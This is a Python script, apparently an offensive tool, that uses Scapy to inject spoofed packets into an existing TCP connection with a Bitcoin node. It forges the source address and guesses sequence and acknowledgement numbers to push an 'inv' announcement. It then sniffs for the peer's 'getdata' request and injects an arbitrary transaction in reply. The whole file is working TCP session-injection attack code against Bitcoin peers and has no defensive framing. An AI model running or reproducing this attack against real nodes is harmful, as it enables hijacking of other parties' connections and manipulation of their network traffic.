#!/usr/bin/env python3
from __future__ import annotations

import argparse
import hashlib
import struct
import time
from typing import Optional, Tuple

from scapy.all import IP, TCP, Raw, send, sniff, conf

conf.verb = 0

# Bitcoin mainnet magic
MAGIC = b"\xf9\xbe\xb4\xd9"


# -----------------------------
# Bitcoin message helpers
# -----------------------------
def sha256d(b: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()


def checksum4(payload: bytes) -> bytes:
    return sha256d(payload)[:4]


def btc_msg(command: str, payload: bytes) -> bytes:
    """
    Bitcoin P2P message: magic(4) + command(12) + length(4) + checksum(4) + payload
    """
    cmd = command.encode("ascii")
    if len(cmd) > 12:
        raise ValueError("command too long")
    return (
        MAGIC
        + cmd.ljust(12, b"\x00")
        + struct.pack("<I", len(payload))
        + checksum4(payload)
        + payload
    )


def encode_varint(n: int) -> bytes:
    if n < 0:
        raise ValueError("varint negative")
    if n < 0xFD:
        return struct.pack("<B", n)
    if n <= 0xFFFF:
        return b"\xFD" + struct.pack("<H", n)
    if n <= 0xFFFFFFFF:
        return b"\xFE" + struct.pack("<I", n)
    return b"\xFF" + struct.pack("<Q", n)


def build_inv_payload(inv_type: int, obj_hash_32: bytes) -> bytes:
    """
    inv payload = varint(count=1) + inv_vector
    inv_vector = type(uint32 little) + hash(32)
    """
    if len(obj_hash_32) != 32:
        raise ValueError("obj_hash_32 must be 32 bytes")
    return encode_varint(1) + struct.pack("<I", inv_type) + obj_hash_32


def parse_btc_header(data: bytes) -> Optional[Tuple[str, int]]:
    """
    Parse Bitcoin message header in Raw bytes.
    Return (command, payload_len) if present; else None.
    """
    if len(data) < 24:
        return None
    if data[0:4] != MAGIC:
        return None
    cmd = data[4:16].rstrip(b"\x00").decode("ascii", errors="ignore")
    payload_len = struct.unpack("<I", data[16:20])[0]
    return cmd, payload_len


# -----------------------------
# Main logic
# -----------------------------
def main():
    ap = argparse.ArgumentParser("Inject inv then send tx when getdata arrives")
    ap.add_argument("--iface", default=None, help="Network interface for send/sniff (recommended)")
    ap.add_argument("--src-ip", required=True)
    ap.add_argument("--dst-ip", required=True)
    ap.add_argument("--src-port", type=int, required=True)
    ap.add_argument("--dst-port", type=int, required=True)

    ap.add_argument("--seq", type=int, required=True, help="Expected/guessed TCP SEQ to use")
    ap.add_argument("--ack", type=int, required=True, help="Expected/guessed TCP ACK to use")

    ap.add_argument("--inv-type", type=int, default=1, help="inv type: 1=TX, 2=BLOCK (default: 1)")
    ap.add_argument(
        "--txid-hex",
        default=None,
        help="32-byte txid hex (big-endian hex). If omitted, uses dummy 0x42..",
    )
    ap.add_argument(
        "--tx-hex",
        default=None,
        help="Raw transaction bytes as hex. If omitted, send a placeholder and warn.",
    )
    ap.add_argument("--timeout", type=float, default=5.0)
    args = ap.parse_args()

    # txid: in Bitcoin inv/getdata it's sent as 32-byte hash (little-endian on the wire)
    if args.txid_hex:
        txid_be = bytes.fromhex(args.txid_hex)
        if len(txid_be) != 32:
            raise ValueError("txid-hex must be 32 bytes (64 hex chars)")
        txid_wire = txid_be[::-1]  # convert to little-endian for wire format
    else:
        txid_wire = (b"\x42" * 32)

    inv_payload = build_inv_payload(args.inv_type, txid_wire)
    inv_msg = btc_msg("inv", inv_payload)

    tx_bytes = b""
    if args.tx_hex:
        tx_bytes = bytes.fromhex(args.tx_hex)
    else:
        # Placeholder: this will almost surely be rejected by the peer,
        # but keeps the script runnable.
        tx_bytes = b"\x00"
        print("[!] WARNING: --tx-hex not provided; sending placeholder tx (likely rejected).")

    tx_msg = btc_msg("tx", tx_bytes)

    print(f"[*] Injecting 'inv' using SEQ={args.seq} ACK={args.ack}")
    ip = IP(src=args.src_ip, dst=args.dst_ip)
    tcp = TCP(
        sport=args.src_port,
        dport=args.dst_port,
        flags="PA",
        seq=args.seq & 0xFFFFFFFF,
        ack=args.ack & 0xFFFFFFFF,
    )

    # Send inv
    send(ip / tcp / Raw(inv_msg), iface=args.iface, verbose=False)

    print(f"[*] Monitoring for 'getdata' (timeout={args.timeout}s)...")

    state = {"sent_tx": False}

    def monitor(pkt):
        if not pkt.haslayer(Raw) or not pkt.haslayer(TCP):
            return False
        data = bytes(pkt[Raw].load)
        hdr = parse_btc_header(data)
        if not hdr:
            return False

        cmd, plen = hdr
        if cmd != "getdata":
            return False

        print("[!] SUCCESS: received getdata from peer (trigger).")
        print(f"    Peer TCP seq={pkt[TCP].seq} ack={pkt[TCP].ack} payload_len={plen}")

        if not state["sent_tx"]:
            # Advance SEQ for sending TX: we already sent inv payload length
            inv_len = len(inv_msg)
            next_seq = (args.seq + inv_len) & 0xFFFFFFFF

            tx_tcp = TCP(
                sport=args.src_port,
                dport=args.dst_port,
                flags="PA",
                seq=next_seq,
                ack=args.ack & 0xFFFFFFFF,
            )
            send(ip / tx_tcp / Raw(tx_msg), iface=args.iface, verbose=False)
            state["sent_tx"] = True
            print(f"[+] Sent 'tx' message (len={len(tx_msg)} bytes) using SEQ={next_seq} ACK={args.ack}")

        return True  # stop sniff after first getdata

    # BPF filter to reduce load; still parse in monitor()
    bpf = f"tcp and host {args.dst_ip} and port {args.dst_port}"
    sniff(
        iface=args.iface,
        filter=bpf,
        prn=None,
        stop_filter=monitor,
        timeout=args.timeout,
        store=False,
    )

    if not state["sent_tx"]:
        print("[*] No getdata observed within timeout; no tx sent.")


if __name__ == "__main__":
    main()
